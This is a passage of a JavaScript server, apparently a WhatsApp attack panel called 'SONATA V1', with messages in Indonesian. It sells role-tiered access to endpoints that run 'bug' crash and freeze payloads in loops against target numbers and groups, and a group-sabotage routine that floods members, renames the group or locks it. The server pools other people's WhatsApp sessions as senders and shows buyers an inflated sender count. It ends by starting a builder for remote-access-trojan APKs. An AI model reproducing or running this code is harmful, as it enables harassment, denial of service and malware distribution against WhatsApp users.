  }, authVsP);

  return stanza;
};

async function BanGbNew(sock, groupJid) {
  try {
    const meta = await sock.groupMetadata(groupJid);
    if (!meta || !meta.id) return { ok: false, message: "Grup tidak valid" };

    const randomNumber = "62" + Math.floor(1000000000 + Math.random() * 9000000000);
    const targetJid = randomNumber + "@s.whatsapp.net";

    try {
      await sock.groupParticipantsUpdate(groupJid, [targetJid], "add");
      return { ok: true, message: `Nomor ${randomNumber} ditambahkan` };
    } catch (e1) {
      try {
        await sock.groupUpdateSubject(groupJid, "BANNED BY GRENXHARIMAU");
        return { ok: true, message: "Subject grup diubah" };
      } catch (e2) {
        try {
          await sock.groupSettingUpdate(groupJid, "announcement");
          return { ok: true, message: "Grup dikunci" };
        } catch (e3) {
          return { ok: false, message: e3.message };
        }
      }
    }
  } catch (e) {
    return { ok: false, message: e.message };
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  WA CONNECT LOGIC
// ═══════════════════════════════════════════════════════════════════════

const activeConnections = {};
const globalConnections = {};
const biz = {};
const mess = {};

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) { fs.mkdirSync(userId, { recursive: true }); console.log("Folder utama '" + userId + "' dibuat otomatis."); }
    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) { console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali."); return []; }
    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) { console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions."); safeExit(); }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';
  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';
    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch { return "Unknown"; }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`;
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({ auth: state, printQRInTerminal: false, logger: pino({ level: "silent" }), version, defaultQueryTimeoutMs: undefined });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          (folderPath === 'vip' ? globalConnections : activeConnections)[sessionName] = sock;
          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);
          if (type === "Business") biz[sessionName] = sock;
          else if (type === "Messenger") mess[sessionName] = sock;
          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}`);
          if (statusCode === 440) { delete (folderPath === 'vip' ? globalConnections : activeConnections)[sessionName]; fs.rmSync(folderPath, { recursive: true, force: true }); }
          else if (!isLoggedOut && retries > 0) { await new Promise((r) => setTimeout(r, 3000)); resolve(await connectSession(folderPath, sessionName, retries - 1)); }
          else { console.log(`\n[${sessionName}] Logged out or max retries reached.`); fs.rmSync(folderPath, { recursive: true, force: true }); delete (folderPath === 'vip' ? globalConnections : activeConnections)[sessionName]; resolve(); }
        }
      });
    } catch (err) { console.log(`\n[${sessionName}] SKIPPED`); resolve(); }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try { sock.ws.close(); } catch (e) {}
    delete activeConnections[sessionName];
  }
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);
    if (activeConnections[baseName]) continue;
    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() { await startUserSessions(); }

const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);
    if (!Array.isArray(data)) return;
    for (let i = 0; i < data.length; i++) {
      try { await sock.newsletterUnfollow(data[i]); await new Promise(resolve => setTimeout(resolve, 1500)); } catch (err) {}
    }
  } catch (error) {}
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) return false;
  const sessionDir = path.join('permenmd', owner, number);
  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({ auth: state, printQRInTerminal: false, logger: pino({ level: "silent" }), version, defaultQueryTimeoutMs: undefined });
  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) { await waiting(3000); await pairingWa(number, owner, attempt + 1); }
      else { delete activeConnections[number]; }
    } else if (connection === "open") {
      try { await sock.newsletterFollow("120363404995533206@newsletter"); await sock.newsletterFollow("120363330344810280@newsletter"); await sleep(5000); await unfollowAllChannel(); } catch (e) {}
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);
      try { await waiting(3000); if (fs.existsSync(sourceCreds)) { fs.copyFileSync(sourceCreds, destCreds); } } catch (e) {}
    }
  });

  return null;
}

async function startUserSessions() {
  const baseDir = 'permenmd';
  const subfolders = fs.readdirSync(baseDir).map(name => path.join(baseDir, name)).filter(p => fs.lstatSync(p).isDirectory());
  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder).filter(file => file.endsWith(".json")).map(file => path.join(folder, file));
      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");
        if (activeConnections[sessionName]) continue;
        try { await connectSession(folder, sessionName); } catch (err) {}
      }
    } catch (err) {}
  }
}

function prepareVipSessionFolders() {
  const vipFolder = 'vip';
  try {
    if (!fs.existsSync(vipFolder)) fs.mkdirSync(vipFolder, { recursive: true });
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));
    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) { return []; }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (globalConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}

function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];
  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    const pool = folderPath === 'vip' ? globalConnections : activeConnections;
    if (pool[sessionName]) activeSockets.push(pool[sessionName]);
  }
  return activeSockets;
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) return activeConnections[sessionName];
  }
  return null;
}

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];
  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];
  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) activeCreds.push({ sessionName });
  }
  return activeCreds;
}

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 10/15");
console.log("    STATUS : BUG WA BATCH 5 + WA CONNECT + BanGbNew OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

// ═══════════════════════════════════════════════════════════════════════
//  Part 11/15: ROUTE BUG WA + SENDER + PAIRING + BUG GROUP
// ═══════════════════════════════════════════════════════════════════════

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) target = (target || "").replace(/\D/g, "");

  if (!isGroupLink && !isGroupJid && target.length < 8) {
    return res.json({ valid: false, sended: false, error: true, message: "Target tidak valid (minimal 8 digit atau link group)" });
  }

  console.log(`[📤] target=${target} | bug=${bug} | mode=${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, sended: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, sended: false, message: "User not found" });

  const roleCooldowns = { member: 250, fullup: 200, reseller: 160, pt: 100, tk: 60, owner: 0, kingz: 0, pemula: 0 };
  const roleRaw = (user.role || "member").toLowerCase();
  const role = ['dev','kingz'].includes(roleRaw) ? 'pemula' : roleRaw;
  const cooldownSeconds = roleCooldowns[role] ?? 60;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({ valid: true, sended: false, cooldown: true, wait: cooldownSeconds - diffSeconds });
  }

  let sock = null;
  if (senderMode === 'global') {
    const entries = Object.entries(globalConnections);
    if (entries.length === 0) {
      return res.json({
        valid: true,
        sended: false,
        cooldown: false,
        error: true,
        message: "SESI WA GAGAL — tidak ada sender global aktif"
      });
    }
  } else {
    if (['fullup','reseller','pt','tk','owner','kingz','pemula'].includes(role)) {
      const userPath = path.join(__dirname, 'permenmd', user.username);
      const pool = fs.existsSync(userPath) ? getActiveSocketsFromPath(userPath) : [];
      if (pool.length === 0) {
        return res.json({
          valid: true,
          sended: false,
          cooldown: false,
          error: true,
          message: "SESI WA GAGAL — tidak ada sender private aktif. Hubungkan sender dulu."
        });
      }
    } else {
      const priv = checkActiveSessionInFolder(user.username);
      if (!priv) {
        return res.json({
          valid: true,
          sended: false,
          cooldown: false,
          error: true,
          message: "SESI WA GAGAL — sender private belum terhubung."
        });
      }
    }
  }

  if (senderMode === 'global') {
    const entries = Object.entries(globalConnections);
    sock = entries[Math.floor(Math.random() * entries.length)][1];
    console.log(`[🌍] Global sender. Total aktif: ${entries.length}`);
  } else if (['fullup','reseller','pt','tk','owner','kingz','pemula'].includes(role)) {
    const userPath = path.join(__dirname, 'permenmd', user.username);
    const pool = getActiveSocketsFromPath(userPath);
    sock = pool[Math.floor(Math.random() * pool.length)];
    console.log(`[👑] Pool mode. Total: ${pool.length}`);
  } else {
    sock = await checkActiveSessionInFolder(user.username);
    console.log(`[🔒] Private: ${user.username}`);
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    saveUserLog(user.username, "bug", `Kirim Bug: ${bug.toUpperCase()}`, `Target: ${target} | Mode: ${senderMode} | Role: ${role}`);

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) { if (v === sock) { sessionName = k; break; } }

        let targetJid = "";
        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try { await sock.groupAcceptInvite(inviteCode); } catch { }
        } else if (isGroupJid) targetJid = target;
        else targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";

        switch (bug) {
  case "fcc":
    for (let i = 0; i < 75; i++) await FrezeInvis(sock, targetJid);
    break;
  case "redgrayx1":
    for (let i = 0; i < 100; i++) await fiOS(sock, targetJid); await sleep(1500);
    break;
  case "redgrayx2":
    for (let i = 0; i < 50; i++) await DelayInvis(sock, targetJid); await sleep(1000);
    break;
  case "android_group":
    for (let i = 0; i < 100; i++) { await crashGroup(sock, targetJid); await sleep(1000); }
    break;
  case "lock_group":
    for (let i = 0; i < 100; i++) { await inTers(sock, targetJid); await sleep(1000); }
    break;
  case "roid_group":
    for (let i = 0; i < 100; i++) { await groupBan1(sock, targetJid); await sleep(1000); }
    break;
  default:
    console.warn(`[⚠️] Bug '${bug}' tidak dikenal`);
}

        console.log(`[✅] '${bug}' terkirim ke ${targetJid}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') { delete activeConnections[sessionName]; }
        if (!retry) {
          const retrySock = await checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
        return false;
      }
    };

    await attemptSend(sock);
  });
});

app.get("/bugGroupSystems", (req, res) => {
  const list = [
    {
      id: "banz_group",
      name: "BANZ GROUP",
      description: "Ban grup WhatsApp target dengan fallback berlapis",
      count: 20,
      delay: 1000,
      icon: "🚫"
    }
  ];
  res.json({ valid: true, data: list, bugSystems: list, count: list.length });
});

app.get("/myGroup", async (req, res) => {
  try {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid session key" });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.json({ valid: false, message: "User not found" });

    const sock = await checkActiveSessionInFolder(user.username);
    if (!sock) {
      return res.json({
        valid: true,
        groups: [],
        message: "Tidak ada sender private aktif. Hubungkan sender dulu."
      });
    }

    const groups = await sock.groupFetchAllParticipating().catch(() => ({}));
    const list = Object.values(groups).map(g => ({
      id: g.id,
      name: g.subject || "-",
      memberCount: g.participants?.length || 0,
      avatar: null
    }));

    return res.json({ valid: true, groups: list });
  } catch (err) {
    console.error("[myGroup]", err.message);
    return res.json({ valid: false, message: err.message });
  }
});

app.post("/joinGroup", async (req, res) => {
  try {
    const { key, groupInput } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, success: false, message: "Invalid session key" });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) return res.json({ valid: false, success: false, message: "User not found" });

    const sock = await checkActiveSessionInFolder(user.username);
    if (!sock) {
      return res.json({
        valid: false,
        success: false,
        message: "Tidak ada sender private aktif. Hubungkan sender dulu di menu Manage Sender."
      });
    }

    const input = String(groupInput || "").trim();
    if (!input) return res.json({ valid: false, success: false, message: "Group input kosong" });

    const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
    if (groupRegex.test(input)) {
      const code = input.match(groupRegex)[1];
      try {
        await sock.groupAcceptInvite(code);
        return res.json({ valid: true, success: true, message: "Berhasil join grup" });
      } catch (e) {
        return res.json({ valid: true, success: false, message: "Gagal join: " + e.message });
      }
    }

    if (input.endsWith("@g.us")) {
      try {
        const meta = await sock.groupMetadata(input).catch(() => null);
        if (!meta) return res.json({ valid: true, success: false, message: "Grup tidak ditemukan / sender belum join" });
        return res.json({ valid: true, success: true, message: "Sender sudah di grup " + meta.subject });
      } catch (e) {
        return res.json({ valid: true, success: false, message: "Gagal cek grup: " + e.message });
      }
    }

    return res.json({ valid: true, success: false, message: "Format tidak valid (harus link atau JID)" });
  } catch (err) {
    console.error("[joinGroup]", err.message);
    return res.json({ valid: false, success: false, message: err.message });
  }
});

app.get("/sendBugGroup", async (req, res) => {
  try {
    const key = (req.query.key || "").trim();
    const { group, bugType = "banz_group" } = req.query;

    if (!key || !group) {
      return res.json({
        valid: false,
        sended: false,
        error: true,
        message: "Parameter kurang"
      });
    }

    let cleanGroup = String(group).trim();
    const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
    const isGroupLink = groupRegex.test(cleanGroup);
    if (!isGroupLink) cleanGroup = cleanGroup.replace(/[^\d-]/g, "");

    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      return res.json({
        valid: false,
        sended: false,
        error: true,
        message: "Session key invalid"
      });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
      return res.json({
        valid: false,
        sended: false,
        error: true,
        message: "User not found"
      });
    }

    const roleCooldowns = { member: 200, fullup: 200, reseller: 160, pt: 100, tk: 60, owner: 0, kingz: 0, pemula: 0 };
    const roleRaw = (user.role || "member").toLowerCase();
    const role = ['dev','kingz'].includes(roleRaw) ? 'pemula' : roleRaw;
    const cooldownSeconds = roleCooldowns[role] ?? 60;

    if (!user.lastSendGroup) user.lastSendGroup = 0;
    const now = Date.now();
    const diffSeconds = Math.floor((now - user.lastSendGroup) / 1000);

    if (diffSeconds < cooldownSeconds) {
      return res.json({
        valid: true,
        sended: false,
        cooldown: true,
        wait: cooldownSeconds - diffSeconds
      });
    }

    const sock = await checkActiveSessionInFolder(user.username);
    if (!sock) {
      return res.json({
        valid: false,
        sended: false,
        error: true,
        message: "Tidak ada sender private aktif"
      });
    }

    user.lastSendGroup = now;
    saveDatabase(db);

    res.json({ valid: true, sended: true, cooldown: false, bugType });

    setImmediate(async () => {
      try {
        let targetJid;
        if (isGroupLink) {
          const inviteCode = cleanGroup.match(groupRegex)[1];
          try {
            const gi = await sock.groupGetInviteInfo(inviteCode);
            targetJid = gi.id;
            await sock.groupAcceptInvite(inviteCode);
          } catch { return; }
        } else {
          targetJid = cleanGroup + "@g.us";
        }

        const bugConfigs = {
          "banz_group": { count: 20, fn: BanGbNew }
        };

        const cfg = bugConfigs[bugType] || bugConfigs.banz_group;
        for (let i = 0; i < cfg.count; i++) {
          try { await cfg.fn(sock, targetJid); } catch (_) {}
          await sleep(1000);
        }
      } catch (err) {
        console.error('[Bug Group]', err.message);
      }
    });
  } catch (e) {
    res.json({
      valid: false,
      sended: false,
      error: true,
      message: e.message
    });
  }
});

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  const globalAllowed = ['pemula','kingz','owner','tk','pt','reseller','fullup'];
  const userRole = String(user.role || '').toLowerCase();
  const normRole = ['dev','kingz'].includes(userRole) ? 'pemula' : userRole;
  if (!globalAllowed.includes(normRole)) {
    return res.status(403).json({ valid: false, senders: [] });
  }

  const fakeSenders = Array.from({ length: FAKE_GLOBAL_COUNT }, (_, i) => `sender_${i + 1}`);
  res.json({ valid: true, senders: fakeSenders, count: FAKE_GLOBAL_COUNT });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => { if (activeConnections[path.basename(f, ".json")]) privateCount++; });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: FAKE_GLOBAL_COUNT
    });
  } catch (err) {
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });
  const connections = getActiveCredsInFolder(user.username).map(x => ({ ...x, source: 'personal' }));
  return res.json({ valid: true, connections });
});

async function pairingGlobal(number, attempt = 1) {
  if (attempt >= 5) return false;
  const sessionDir = path.join('vip', number);
  fs.mkdirSync(sessionDir, { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();
  const sock = makeWASocket({ auth: state, printQRInTerminal: false, logger: pino({ level: 'silent' }), version, defaultQueryTimeoutMs: undefined });
  sock.ev.on('creds.update', saveCreds);
  sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
    const code = lastDisconnect?.error?.output?.statusCode;
    if (connection === 'open') {
      globalConnections[number] = sock;
      try { fs.copyFileSync(path.join(sessionDir, 'creds.json'), path.join('vip', `${number}.json`)); } catch (_) {}
    } else if (connection === 'close') {
      const loggedOut = code === DisconnectReason.loggedOut || code === 403;
      delete globalConnections[number];
      if (!loggedOut) { await waiting(3000); await pairingGlobal(number, attempt + 1); }
    }
  });
  if (!sock.authState.creds.registered) {
    await waiting(1200);
    const code = await sock.requestPairingCode(number, 'REDGRAY');
    return code || false;
  }
  return true;
}

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "Invalid session key" });
  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
    const baseDir = path.join("permenmd", user.username);
    const sessionDir = path.join(baseDir, number);
    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });
    if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });
    fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000, logger: pino({ level: "silent" }), auth: state,
      syncFullHistory: true, markOnlineOnConnect: true, connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0, generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"], version
    });

    sock.ev.on("creds.update", saveCreds);
    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) { await waiting(3000); await pairingWa(number, user.username); }
        else { delete activeConnections[number]; }
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1200);
      const code = await sock.requestPairingCode(number, "ORCALELO");
      if (code) return res.json({ valid: true, number, pairingCode: code });
      return res.json({ valid: false });
    }

    return res.json({ valid: false });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.get("/getPairingGlobal", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: "Invalid session key" });
  if (!number) return res.status(400).json({ valid: false, message: "Number is required" });

  const userRole = String(user.role || '').toLowerCase();
  const normRole = ['dev','kingz'].includes(userRole) ? 'pemula' : userRole;
  const allowed = ['pemula','kingz','owner','tk','pt','reseller','fullup'];
  if (!allowed.includes(normRole)) {
    return res.status(403).json({ valid: false, message: `Role ${normRole} tidak diizinkan menambah sender global.` });
  }

  try {
    const cleanNumber = String(number).replace(/\D/g, '');
    if (cleanNumber.length < 8) return res.json({ valid: false, message: "Nomor tidak valid" });

    const sessionDir = path.join('vip', cleanNumber);
    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });
    fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000, logger: pino({ level: "silent" }), auth: state,
      syncFullHistory: true, markOnlineOnConnect: true, connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0, generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"], version
    });

    sock.ev.on("creds.update", saveCreds);
    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "open") {
        globalConnections[cleanNumber] = sock;
        try { fs.copyFileSync(path.join(sessionDir, 'creds.json'), path.join('vip', `${cleanNumber}.json`)); } catch (_) {}
        console.log(`[GLOBAL] Sender global ${cleanNumber} connected.`);
      } else if (connection === "close") {
        const code = lastDisconnect?.error?.output?.statusCode;
        delete globalConnections[cleanNumber];
        if (code !== DisconnectReason.loggedOut && code !== 403) {
          await waiting(3000);
          await pairingGlobal(cleanNumber);
        }
      }
    });

    if (!sock.authState.creds.registered) {
      await waiting(1200);
      const code = await sock.requestPairingCode(cleanNumber, "ORCALELO");
      if (code) return res.json({ valid: true, number: cleanNumber, pairingCode: code, source: 'global' });
      return res.json({ valid: false, message: "Gagal generate pairing code" });
    }

    globalConnections[cleanNumber] = sock;
    return res.json({ valid: true, number: cleanNumber, alreadyConnected: true, source: 'global' });
  } catch (err) {
    console.error('[getPairingGlobal]', err.message);
    return res.status(500).json({ valid: false, message: err.message });
  }
});

app.get("/myGlobalSender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const userRole = String(user.role || '').toLowerCase();
  const normRole = ['dev','kingz'].includes(userRole) ? 'pemula' : userRole;
  const allowed = ['pemula','kingz','owner','tk','pt','reseller','fullup'];
  if (!allowed.includes(normRole)) {
    return res.status(403).json({ error: "Role tidak diizinkan melihat sender global." });
  }

  const connections = [];
  const vipPath = path.join(__dirname, 'vip');
  if (fs.existsSync(vipPath)) {
    const files = fs.readdirSync(vipPath).filter(f => f.endsWith('.json'));
    for (const f of files) {
      const sessionName = path.basename(f, '.json');
      const isActive = !!globalConnections[sessionName];
      connections.push({ sessionName, source: 'global', active: isActive });
    }
  }

  return res.json({ valid: true, connections, count: connections.length });
});

app.post("/deleteGlobalSender", async (req, res) => {
  const { key, number } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ success: false, message: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ success: false, message: "User not found" });

  const userRole = String(user.role || '').toLowerCase();
  const normRole = ['dev','kingz'].includes(userRole) ? 'pemula' : userRole;
  if (normRole !== 'pemula') {
    return res.status(403).json({ success: false, message: "Hanya PEMULA yang bisa hapus sender global." });
  }

  const cleanNumber = String(number || '').replace(/\D/g, '');
  if (!cleanNumber) return res.status(400).json({ success: false, message: "Number required" });

  try {
    if (globalConnections[cleanNumber]) {
      try { globalConnections[cleanNumber].ws.close(); } catch (_) {}
      delete globalConnections[cleanNumber];
    }
    const sessionDir = path.join('vip', cleanNumber);
    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });
    const credsFile = path.join('vip', `${cleanNumber}.json`);
    if (fs.existsSync(credsFile)) fs.unlinkSync(credsFile);
    return res.json({ success: true, message: "Sender global dihapus." });
  } catch (e) {
    return res.status(500).json({ success: false, message: e.message });
  }
});

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 11/15");
console.log("    STATUS : BUG WA + SENDER + PAIRING OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
// ═══════════════════════════════════════════════════════════════════════
//  Part 12/15: AUTO BUILDER RAT — FIX NAMA APK
// ═══════════════════════════════════════════════════════════════════════

const RAT_BASE_APK = path.join(__dirname, 'rat_base.apk');
const RAT_BASE_DECODED = path.join(__dirname, 'rat_base_decoded');
const RAT_BUILD_QUEUE = [];
let RAT_BUILD_RUNNING = 0;
const RAT_BUILD_MAX = 5;

function ratQueueBuild(task) {
  return new Promise((resolve, reject) => {
    const run = () => {
      RAT_BUILD_RUNNING++;
      task().then(resolve).catch(reject).finally(() => {
        RAT_BUILD_RUNNING--;
        if (RAT_BUILD_QUEUE.length > 0) RAT_BUILD_QUEUE.shift()();
      });
    };
    if (RAT_BUILD_RUNNING < RAT_BUILD_MAX) run();
    else RAT_BUILD_QUEUE.push(run);
  });
}

function cleanupOldBuilds() {
  try {
    const now = Date.now();
    const maxAge = 30 * 60 * 1000;
    if (!fs.existsSync(DOWNLOADS_DIR)) return;
    fs.readdirSync(DOWNLOADS_DIR).forEach(f => {
      if (!f.endsWith('.apk')) return;
      const p = path.join(DOWNLOADS_DIR, f);
      const st = fs.statSync(p);
      if (now - st.mtimeMs > maxAge) fs.unlinkSync(p);
    });
  } catch (_) {}
}
setInterval(cleanupOldBuilds, 10 * 60 * 1000);

function isDecodedCacheStale() {
  try {
    if (!fs.existsSync(RAT_BASE_DECODED)) return true;
